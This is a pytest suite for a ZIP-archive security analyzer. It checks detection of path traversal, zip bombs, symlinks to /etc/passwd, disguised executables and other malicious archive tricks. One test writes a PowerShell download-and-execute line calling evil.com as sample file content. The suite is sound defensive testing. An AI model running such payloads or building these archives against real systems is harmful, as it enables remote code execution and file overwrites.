"""Tests for ZipAnalyzer — covers safe files, each attack vector, and edge cases."""

import tempfile

import pytest

from zip_analyzer import AnalysisResult, ZipAnalyzer
from zip_analyzer.models import Severity
from tests.fixtures import (
    make_absolute_path_zip,
    make_autorun_zip,
    make_comment_injection_zip,
    make_double_extension_zip,
    make_elf_binary,
    make_encrypted_zip,
    make_macro_document_zip,
    make_many_files_zip,
    make_nested_zip,
    make_null_byte_filename_zip,
    make_path_traversal_zip,
    make_pe_disguised_as_pdf,
    make_safe_zip,
    make_shell_script_zip,
    make_zip_bomb_flat,
    make_zip_with_symlink,
)


@pytest.fixture
def analyzer():
    return ZipAnalyzer()


def write_tmp(data: bytes, suffix=".zip") -> str:
    """Write bytes to a named temp file and return the path."""
    with tempfile.NamedTemporaryFile(delete=False, suffix=suffix) as f:
        f.write(data)
        return f.name


def check_names(result: AnalysisResult):
    """Return the set of check names present in findings."""
    return {f.check for f in result.findings}


def max_sev(result: AnalysisResult) -> Severity:
    return result.max_severity


# ---------------------------------------------------------------------------
# Safe file
# ---------------------------------------------------------------------------

class TestSafeZip:
    def test_clean_zip_is_safe(self, analyzer):
        path = write_tmp(make_safe_zip())
        result = analyzer.analyze(path)
        assert result.safe
        assert result.error is None
        # No high/critical findings
        high_or_critical = [f for f in result.findings if f.severity in (Severity.HIGH, Severity.CRITICAL)]
        assert high_or_critical == []

    def test_no_findings_on_clean_zip(self, analyzer):
        path = write_tmp(make_safe_zip())
        result = analyzer.analyze(path)
        assert len(result.findings) == 0


# ---------------------------------------------------------------------------
# Invalid / corrupt inputs
# ---------------------------------------------------------------------------

class TestInvalidInput:
    def test_not_a_zip(self, analyzer, tmp_path):
        bad = tmp_path / "not_a_zip.zip"
        bad.write_bytes(b"this is not a zip file at all")
        result = analyzer.analyze(bad)
        assert not result.safe
        assert result.error is not None

    def test_empty_file(self, analyzer, tmp_path):
        empty = tmp_path / "empty.zip"
        empty.write_bytes(b"")
        result = analyzer.analyze(empty)
        assert not result.safe
        assert result.error is not None

    def test_nonexistent_path(self, analyzer):
        result = analyzer.analyze("/nonexistent/path/to/file.zip")
        assert not result.safe
        assert result.error is not None


# ---------------------------------------------------------------------------
# Path traversal
# ---------------------------------------------------------------------------

class TestPathTraversal:
    def test_dotdot_path_is_detected(self, analyzer):
        path = write_tmp(make_path_traversal_zip())
        result = analyzer.analyze(path)
        assert "path_traversal" in check_names(result)
        assert max_sev(result) == Severity.CRITICAL

    def test_absolute_path_is_detected(self, analyzer):
        path = write_tmp(make_absolute_path_zip())
        result = analyzer.analyze(path)
        assert "path_traversal" in check_names(result)
        assert max_sev(result) == Severity.CRITICAL

    def test_traversal_makes_zip_unsafe(self, analyzer):
        path = write_tmp(make_path_traversal_zip())
        result = analyzer.analyze(path)
        assert not result.safe


# ---------------------------------------------------------------------------
# Zip bomb
# ---------------------------------------------------------------------------

class TestZipBomb:
    def test_high_compression_ratio_detected(self, analyzer):
        path = write_tmp(make_zip_bomb_flat(ratio=500, compressed_size=2048))
        result = analyzer.analyze(path)
        assert "zip_bomb" in check_names(result)

    def test_zip_bomb_makes_zip_unsafe(self, analyzer):
        path = write_tmp(make_zip_bomb_flat(ratio=500, compressed_size=2048))
        result = analyzer.analyze(path)
        assert not result.safe

    def test_normal_compression_not_flagged(self, analyzer):
        path = write_tmp(make_safe_zip())
        result = analyzer.analyze(path)
        assert "zip_bomb" not in check_names(result)


# ---------------------------------------------------------------------------
# File count
# ---------------------------------------------------------------------------

class TestFileCount:
    def test_excessive_file_count_detected(self, analyzer):
        path = write_tmp(make_many_files_zip(count=15_000))
        result = analyzer.analyze(path)
        assert "file_count" in check_names(result)

    def test_normal_file_count_ok(self, analyzer):
        path = write_tmp(make_safe_zip())
        result = analyzer.analyze(path)
        assert "file_count" not in check_names(result)


# ---------------------------------------------------------------------------
# Dangerous extensions
# ---------------------------------------------------------------------------

class TestDangerousExtensions:
    def test_exe_detected(self, analyzer):
        from tests.fixtures import make_zip
        path = write_tmp(make_zip([("malware.exe", b"MZ" + b"\x00" * 62)]))
        result = analyzer.analyze(path)
        assert "dangerous_extension" in check_names(result)

    def test_powershell_detected(self, analyzer):
        from tests.fixtures import make_zip
        path = write_tmp(make_zip([("evil.ps1", b"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/shell')")]))
        result = analyzer.analyze(path)
        assert "dangerous_extension" in check_names(result)

    def test_shell_script_extension_detected(self, analyzer):
        path = write_tmp(make_shell_script_zip())
        result = analyzer.analyze(path)
        assert "dangerous_extension" in check_names(result)

    def test_macro_document_detected(self, analyzer):
        path = write_tmp(make_macro_document_zip())
        result = analyzer.analyze(path)
        assert "macro_document" in check_names(result)

    def test_jpg_not_flagged_as_dangerous(self, analyzer):
        from tests.fixtures import make_zip
        path = write_tmp(make_zip([("photo.jpg", b"\xff\xd8\xff" + b"\x00" * 20)]))
        result = analyzer.analyze(path)
        assert "dangerous_extension" not in check_names(result)


# ---------------------------------------------------------------------------
# Double extension
# ---------------------------------------------------------------------------

class TestDoubleExtension:
    def test_pdf_exe_detected(self, analyzer):
        path = write_tmp(make_double_extension_zip())
        result = analyzer.analyze(path)
        assert "double_extension" in check_names(result)

    def test_double_extension_is_high_severity(self, analyzer):
        path = write_tmp(make_double_extension_zip())
        result = analyzer.analyze(path)
        double_ext_findings = [f for f in result.findings if f.check == "double_extension"]
        assert all(f.severity == Severity.HIGH for f in double_ext_findings)

    def test_single_extension_not_flagged(self, analyzer):
        path = write_tmp(make_safe_zip())
        result = analyzer.analyze(path)
        assert "double_extension" not in check_names(result)


# ---------------------------------------------------------------------------
# Magic byte mismatch
# ---------------------------------------------------------------------------

class TestMagicBytes:
    def test_pe_disguised_as_pdf_detected(self, analyzer):
        path = write_tmp(make_pe_disguised_as_pdf())
        result = analyzer.analyze(path)
        assert "magic_mismatch" in check_names(result)
        assert max_sev(result) == Severity.CRITICAL

    def test_elf_binary_detected(self, analyzer):
        path = write_tmp(make_elf_binary())
        result = analyzer.analyze(path)
        assert "executable_binary" in check_names(result)

    def test_shell_script_shebang_detected(self, analyzer):
        path = write_tmp(make_shell_script_zip())
        result = analyzer.analyze(path)
        assert "script_file" in check_names(result)

    def test_nested_zip_detected(self, analyzer):
        path = write_tmp(make_nested_zip())
        result = analyzer.analyze(path)
        assert "nested_archive" in check_names(result)

    def test_real_jpeg_not_flagged(self, analyzer):
        from tests.fixtures import make_zip
        jpeg = b"\xff\xd8\xff\xe0" + b"\x00" * 20
        path = write_tmp(make_zip([("photo.jpg", jpeg)]))
        result = analyzer.analyze(path)
        assert "magic_mismatch" not in check_names(result)


# ---------------------------------------------------------------------------
# Suspicious filenames
# ---------------------------------------------------------------------------

class TestSuspiciousNames:
    def test_autorun_inf_detected(self, analyzer):
        path = write_tmp(make_autorun_zip())
        result = analyzer.analyze(path)
        assert "suspicious_filename" in check_names(result)

    def test_ssh_private_key_detected(self, analyzer):
        from tests.fixtures import make_zip
        path = write_tmp(make_zip([("id_rsa", b"-----BEGIN RSA PRIVATE KEY-----\n...")]))
        result = analyzer.analyze(path)
        assert "suspicious_filename" in check_names(result)

    def test_null_byte_in_filename_detected(self, analyzer):
        path = write_tmp(make_null_byte_filename_zip())
        result = analyzer.analyze(path)
        assert "null_byte_filename" in check_names(result)
        assert max_sev(result) == Severity.CRITICAL

    def test_normal_filename_not_flagged(self, analyzer):
        path = write_tmp(make_safe_zip())
        result = analyzer.analyze(path)
        assert "suspicious_filename" not in check_names(result)
        assert "null_byte_filename" not in check_names(result)


# ---------------------------------------------------------------------------
# Symlinks
# ---------------------------------------------------------------------------

class TestSymlinks:
    def test_symlink_detected(self, analyzer):
        path = write_tmp(make_zip_with_symlink("link_to_passwd", "/etc/passwd"))
        result = analyzer.analyze(path)
        assert "symlink" in check_names(result)

    def test_symlink_is_high_severity(self, analyzer):
        path = write_tmp(make_zip_with_symlink("evil_link", "../../sensitive"))
        result = analyzer.analyze(path)
        sym_findings = [f for f in result.findings if f.check == "symlink"]
        assert sym_findings
        assert all(f.severity == Severity.HIGH for f in sym_findings)


# ---------------------------------------------------------------------------
# Encrypted entries
# ---------------------------------------------------------------------------

class TestEncrypted:
    def test_encrypted_entry_flagged(self, analyzer):
        path = write_tmp(make_encrypted_zip())
        result = analyzer.analyze(path)
        assert "encrypted_entry" in check_names(result)

    def test_encrypted_entry_medium_severity(self, analyzer):
        path = write_tmp(make_encrypted_zip())
        result = analyzer.analyze(path)
        enc_findings = [f for f in result.findings if f.check == "encrypted_entry"]
        assert enc_findings
        assert all(f.severity == Severity.MEDIUM for f in enc_findings)


# ---------------------------------------------------------------------------
# Comment injection
# ---------------------------------------------------------------------------

class TestCommentInjection:
    def test_php_in_comment_detected(self, analyzer):
        path = write_tmp(make_comment_injection_zip())
        result = analyzer.analyze(path)
        assert "malicious_comment" in check_names(result)

    def test_benign_comment_not_flagged(self, analyzer):
        from tests.fixtures import make_zip
        path = write_tmp(make_zip([("readme.txt", b"hi")], comment=b"Created with MyApp 1.0"))
        result = analyzer.analyze(path)
        assert "malicious_comment" not in check_names(result)


# ---------------------------------------------------------------------------
# Result model
# ---------------------------------------------------------------------------

class TestAnalysisResult:
    def test_summary_safe(self, analyzer):
        path = write_tmp(make_safe_zip())
        result = analyzer.analyze(path)
        assert "SAFE" in result.summary()

    def test_summary_unsafe(self, analyzer):
        path = write_tmp(make_path_traversal_zip())
        result = analyzer.analyze(path)
        assert "UNSAFE" in result.summary()

    def test_finding_str_includes_severity(self, analyzer):
        path = write_tmp(make_path_traversal_zip())
        result = analyzer.analyze(path)
        finding_strs = [str(f) for f in result.findings]
        assert any("CRITICAL" in s for s in finding_strs)

    def test_max_severity_none_when_no_findings(self, analyzer):
        path = write_tmp(make_safe_zip())
        result = analyzer.analyze(path)
        assert result.max_severity is None
